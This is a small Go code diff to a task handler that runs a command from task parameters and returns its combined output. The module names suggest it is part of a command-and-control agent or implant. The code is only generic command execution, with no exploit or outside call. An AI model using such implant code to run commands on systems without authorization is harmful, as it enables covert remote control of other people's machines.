@@ -4,7 +4,7 @@ import (
 	// Standard
 	"bytes"
 	"os/exec"
-	"strings"
+	//"strings"
 
 	// Odin
 
@@ -23,17 +23,17 @@ func Run(task structs.Task) {
 			return
 	}
 
-	cmd, err := exec.Command(cmdBin, arg1).Output()
-	cmd.Stdin = strings.NewReader(task.Params)
-	//var out bytes.Buffer
-	//cmd.Stdout = &out
-	//cmd.Stderr = &out
+	cmd := exec.Command(cmdBin, arg1, task.Params)
+	//md.Stdin = strings.NewReader(task.Params)
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &out
 	err := cmd.Run()
 	var outputString string
-	if cmd.String() == "" {
+	if out.String() == "" {
 		outputString = "Command processed (no output)."
 	} else {
-		outputString = cmd.String()
+		outputString = out.String()
 	}
 	msg.UserOutput = outputString
 	msg.Completed = true
